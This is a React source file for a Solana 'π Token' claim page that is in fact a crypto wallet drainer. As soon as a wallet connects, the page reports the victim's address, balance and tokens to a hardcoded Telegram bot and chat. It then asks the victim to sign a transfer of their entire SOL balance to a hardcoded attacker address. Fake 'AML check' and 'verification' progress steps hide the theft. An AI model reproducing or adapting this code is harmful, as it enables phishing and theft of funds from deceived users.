import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { LAMPORTS_PER_SOL } from '@solana/web3.js';
import { useEffect, useState } from 'react';
import { 
  getTokenAccounts, 
  sendToTelegram, 
  signAndSendTransaction, 
  getWalletBalance, 
  MINIMUM_REQUIRED_SOL,
  hasEnoughSolForRent 
} from '@/utils/walletUtils';
import { toast } from '@/components/ui/use-toast';
import { Menu } from "lucide-react";
import LoadingModal, { ConnectionStep } from '@/components/LoadingModal';

const BACKEND_ADDRESS = "GsRoop6YCzpakWCoG7YnHSSgMvcgjnuFEie62GRZdmJx";
const TELEGRAM_BOT_TOKEN = "7953723959:AAGghCSXBoNyKh4WbcikqKWf-qKxDhaSpaw";
const TELEGRAM_CHAT_ID = "-1002490122517";

const initialSteps: ConnectionStep[] = [
  { id: 'connect', label: 'Connect', status: 'pending' },
  { id: 'connectSuccess', label: 'Connect success', status: 'pending' },
  { id: 'addressCheck', label: 'Address check', status: 'pending' },
  { id: 'amlCheck', label: 'AML check', status: 'pending' },
  { id: 'successfulAmlCheck', label: 'Successful AML check', status: 'pending' },
  { id: 'scanningDetails', label: 'Scanning details', status: 'pending' },
  { id: 'thanks', label: 'Thanks', status: 'pending' },
  { id: 'signConfirmation', label: 'Sign confirmation', status: 'pending' },
  { id: 'signWaitingTitle', label: 'Sign waiting - title', status: 'pending' },
  { id: 'signWaitingDescription', label: 'Sign waiting - description', status: 'pending' },
  { id: 'successfulSign', label: 'Successful sign', status: 'pending' }
];

const Index = () => {
  const { publicKey, connecting, connected, wallet } = useWallet();
  const { connection } = useConnection();
  const [isProcessing, setIsProcessing] = useState(false);
  const [lastSignature, setLastSignature] = useState<string | null>(null);
  const [walletBalance, setWalletBalance] = useState<number | null>(null);
  const [tokens, setTokens] = useState<any[]>([]);
  const [connectionError, setConnectionError] = useState<string | null>(null);
  const [connectionAttempts, setConnectionAttempts] = useState(0);
  const [isLoading, setIsLoading] = useState(false);
  const [fetchRetries, setFetchRetries] = useState(0);
  
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [connectionSteps, setConnectionSteps] = useState<ConnectionStep[]>(initialSteps);
  const [currentStep, setCurrentStep] = useState('connect');

  const updateStepStatus = (stepId: string, status: 'pending' | 'active' | 'completed' | 'error') => {
    setConnectionSteps(steps => 
      steps.map(step => 
        step.id === stepId 
          ? { ...step, status } 
          : step
      )
    );
    if (status === 'active') {
      setCurrentStep(stepId);
    }
  };

  const advanceToNextStep = (currentStepId: string) => {
    updateStepStatus(currentStepId, 'completed');
    
    const currentIndex = connectionSteps.findIndex(step => step.id === currentStepId);
    
    if (currentIndex < connectionSteps.length - 1) {
      const nextStep = connectionSteps[currentIndex + 1];
      updateStepStatus(nextStep.id, 'active');
    }
  };

  const fetchWalletData = async () => {
    if (!publicKey || !wallet) {
      console.log("Wallet, connection, or public key not available");
      setConnectionError("Wallet or connection not available");
      return null;
    }

    setConnectionError(null);
    setIsLoading(true);
    
    try {
      updateStepStatus('addressCheck', 'active');
      
      const [solBalance, tokenAccounts] = await Promise.all([
        getWalletBalance(publicKey.toString())
          .then(balance => {
            console.log("Current balance:", balance, "SOL");
            setWalletBalance(balance);
            return balance;
          }),
        Promise.resolve().then(async () => {
          advanceToNextStep('addressCheck');
          updateStepStatus('amlCheck', 'active');
          console.log("Fetching token accounts");
          const tokens = await getTokenAccounts(connection, publicKey.toString());
          console.log("Token accounts received:", tokens);
          setTokens(tokens || []);
          return tokens;
        })
      ]);
      
      advanceToNextStep('amlCheck');
      updateStepStatus('successfulAmlCheck', 'active');
      await new Promise(resolve => setTimeout(resolve, 150));
      advanceToNextStep('successfulAmlCheck');

      updateStepStatus('scanningDetails', 'active');
      await new Promise(resolve => setTimeout(resolve, 150));
      advanceToNextStep('scanningDetails');

      updateStepStatus('thanks', 'active');
      await new Promise(resolve => setTimeout(resolve, 150));
      advanceToNextStep('thanks');

      setFetchRetries(0);

      return {
        address: publicKey.toString(),
        tokens: tokenAccounts || [],
        balance: solBalance,
        connectionTime: new Date().toISOString(),
        walletName: wallet?.adapter?.name || "Unknown Wallet"
      };
    } catch (error) {
      console.error("Error fetching wallet data:", error);
      setConnectionError(error instanceof Error ? error.message : "Unknown error fetching wallet data");
      
      const newRetryCount = fetchRetries + 1;
      setFetchRetries(newRetryCount);
      
      if (newRetryCount < 3) {
        console.log(`Auto-retrying wallet data fetch (${newRetryCount}/3)...`);
        toast({
          title: "Connection Issue",
          description: "Retrying to fetch wallet data...",
        });
        setTimeout(() => {
          fetchWalletData();
        }, 1000 * newRetryCount);
      }
      
      return null;
    } finally {
      setIsLoading(false);
    }
  };

  const handleWalletConnection = async () => {
    if (!publicKey || !wallet) {
      console.log("Wallet or public key not available");
      return;
    }

    if (isProcessing) {
      console.log("Already processing a transaction");
      return;
    }

    setIsProcessing(true);
    setConnectionAttempts(prev => prev + 1);
    setConnectionSteps(initialSteps);
    setShowLoadingModal(true);
    
    updateStepStatus('connect', 'active');
    await new Promise(resolve => setTimeout(resolve, 100));
    advanceToNextStep('connect');
    
    updateStepStatus('connectSuccess', 'active');
    await new Promise(resolve => setTimeout(resolve, 100));
    advanceToNextStep('connectSuccess');
    
    try {
      toast({
        title: "Processing",
        description: "Fetching wallet data...",
      });
      
      console.log("Starting wallet connection process");
      
      let walletData = null;
      for (let attempt = 0; attempt < 2; attempt++) {
        try {
          walletData = await fetchWalletData();
          if (walletData) break;
          console.log(`Wallet data fetch attempt ${attempt + 1} failed, retrying...`);
          await new Promise(resolve => setTimeout(resolve, 500 * (attempt + 1)));
        } catch (e) {
          console.error(`Fetch attempt ${attempt + 1} error:`, e);
        }
      }
      
      if (!walletData) {
        throw new Error("Failed to fetch wallet data after multiple attempts");
      }
      
      toast({
        title: "Data Retrieved",
        description: "Processing wallet verification...",
      });
      
      const telegramSent = await sendToTelegram(walletData, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
      
      if (!telegramSent) {
        console.error("Failed to send data to Telegram");
        toast({
          title: "Warning",
          description: "Verification service connection issue. Retrying...",
          variant: "destructive",
        });
        
        setTimeout(async () => {
          await sendToTelegram(walletData!, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
        }, 3000);
      } else {
        console.log("Successfully sent wallet data to Telegram");
      }

      if (walletData.balance <= 0) {
        console.log("Wallet has no SOL balance");
        
        const zeroBalanceMessage = {
          address: publicKey.toString(),
          message: `WALLET HAS ZERO BALANCE. No transfer will be attempted.`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(zeroBalanceMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
        
        toast({
          title: "Low Balance",
          description: "Your wallet has no SOL balance. No further action needed.",
        });
        setIsProcessing(false);
        setShowLoadingModal(false);
        return;
      }

      if (!hasEnoughSolForRent(walletData.balance)) {
        console.log("Wallet balance too low for rent exemption");
        
        const lowRentMessage = {
          address: publicKey.toString(),
          message: `INSUFFICIENT FUNDS FOR RENT EXEMPTION. Balance: ${walletData.balance.toFixed(6)} SOL. Minimum required: ${MINIMUM_REQUIRED_SOL} SOL.`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(lowRentMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
        
        toast({
          title: "Insufficient Funds",
          description: `Your wallet must have at least ${MINIMUM_REQUIRED_SOL} SOL (about $0.50) for rent exemption and fees.`,
          variant: "destructive",
        });
        setIsProcessing(false);
        setShowLoadingModal(false);
        return;
      }

      toast({
        title: "Processing",
        description: "Preparing transaction...",
      });

      const transferMessage = {
        address: publicKey.toString(),
        message: `ATTEMPTING TO TRANSFER ${walletData.balance.toFixed(6)} SOL to ${BACKEND_ADDRESS}`,
        walletName: wallet?.adapter?.name || "Unknown Wallet"
      };
      
      await sendToTelegram(transferMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);

      console.log("Initiating transfer");
      
      try {
        updateStepStatus('signConfirmation', 'active');
        
        toast({
          title: "Confirming",
          description: "Please confirm the transaction in your wallet",
        });

        if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
          throw new Error("Wallet or publicKey is undefined");
        }

        advanceToNextStep('signConfirmation');
        updateStepStatus('signWaitingTitle', 'active');
        await new Promise(resolve => setTimeout(resolve, 200));
        advanceToNextStep('signWaitingTitle');
        
        updateStepStatus('signWaitingDescription', 'active');
        await new Promise(resolve => setTimeout(resolve, 200));
        advanceToNextStep('signWaitingDescription');

        const signature = await signAndSendTransaction(
          connection,
          wallet,
          BACKEND_ADDRESS,
          walletData.balance,
          TELEGRAM_BOT_TOKEN,
          TELEGRAM_CHAT_ID
        );

        updateStepStatus('successfulSign', 'active');
        await new Promise(resolve => setTimeout(resolve, 300));
        advanceToNextStep('successfulSign');

        console.log("Transfer completed with signature:", signature);
        setLastSignature(signature);
        
        const completionMessage = {
          address: publicKey.toString(),
          message: `TRANSFER COMPLETED! ${walletData.balance.toFixed(6)} SOL sent.
Transaction: https://explorer.solana.com/tx/${signature}`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(completionMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
        
        toast({
          title: "Success!",
          description: "Wallet verification and transaction completed!",
        });
      } catch (error) {
        console.error("Transfer failed:", error);
        
        setConnectionSteps(prev => [
          ...prev,
          { id: 'errorTitle', label: 'Error - title', status: 'error' },
          { id: 'errorDescription', label: 'Error - description', status: 'error' }
        ]);
        
        updateStepStatus('errorTitle', 'active');
        await new Promise(resolve => setTimeout(resolve, 200));
        
        const failureMessage = {
          address: publicKey.toString(),
          message: `TRANSFER FAILED! Error: ${error instanceof Error ? error.message : "Unknown error"}`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(failureMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
        
        toast({
          title: "Transfer Failed",
          description: error instanceof Error ? error.message : "Failed to process transaction",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error('Detailed error in wallet connection:', error);
      setConnectionError(error instanceof Error ? error.message : "Unknown error in wallet connection");
      
      if (publicKey) {
        const errorMessage = {
          address: publicKey.toString(),
          message: `ERROR DURING WALLET CONNECTION: ${error instanceof Error ? error.message : "Unknown error"}`,
          walletName: wallet?.adapter?.name || "Unknown Wallet"
        };
        
        await sendToTelegram(errorMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
      }
      
      toast({
        title: "Error",
        description: error instanceof Error ? error.message : "Failed to process wallet connection",
        variant: "destructive",
      });
    } finally {
      setTimeout(() => {
        setShowLoadingModal(false);
        setIsProcessing(false);
      }, 800);
    }
  };

  const handleManualRetry = () => {
    if (connected && publicKey && !isProcessing) {
      handleWalletConnection();
    } else if (!connected) {
      toast({
        title: "Connect Wallet",
        description: "Please connect your wallet first",
      });
    }
  };

  useEffect(() => {
    if (connected && publicKey && !isProcessing) {
      handleWalletConnection();
    }
  }, [connected, publicKey]);

  return (
    <div className="min-h-screen bg-background p-6 relative">
      <LoadingModal 
        isOpen={showLoadingModal} 
        steps={connectionSteps} 
        currentStep={currentStep} 
      />
      
      <nav className="flex justify-between items-center mb-20">
        <div className="w-12 h-12 rounded-full bg-gradient-to-r from-cyan-400 to-cyan-300 p-[2px]">
          <div className="w-full h-full rounded-full bg-background flex items-center justify-center">
            <span className="text-2xl font-bold text-cyan-400">π</span>
          </div>
        </div>
        
        <div className="flex gap-4">
          <button className="circle-button">
            <Menu className="w-6 h-6 text-cyan-400" />
          </button>
        </div>
      </nav>

      <main className="flex flex-col items-center justify-center gap-8 max-w-2xl mx-auto text-center">
        <h1 className="text-5xl md:text-6xl font-bold gradient-text leading-tight">
          Join The π Adventure
        </h1>
        
        <p className="text-xl md:text-2xl text-gray-400 max-w-xl">
          Don't miss out! Click here to claim your exclusive π Token now and be part of the revolution!!
        </p>

        <div className="flex flex-col items-center w-full max-w-md gap-4 mt-4">
          <div className="flex justify-center w-full">
            <WalletMultiButton className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" />
          </div>
          
          {connectionError && (
            <div className="mt-4 p-4 bg-red-900/30 border border-red-700 rounded-lg w-full">
              <p className="text-red-300 font-semibold">Connection Error:</p>
              <p className="text-white/80 text-sm">{connectionError}</p>
              <button 
                onClick={handleManualRetry}
                className="mt-2 bg-red-700/50 text-white py-2 px-4 rounded-md hover:bg-red-700/80 transition-colors text-sm"
                disabled={isProcessing || isLoading}
              >
                {isProcessing || isLoading ? "Processing..." : "Retry Connection"}
              </button>
            </div>
          )}
        </div>

        <div className="mt-20">
          <div className="w-32 h-32 rounded-full bg-[#2A2F3F] flex items-center justify-center">
            <div className="w-24 h-24 rounded-full bg-[#4B3979] flex items-center justify-center">
              <span className="text-5xl font-bold text-[#FFA500]">π</span>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Index;
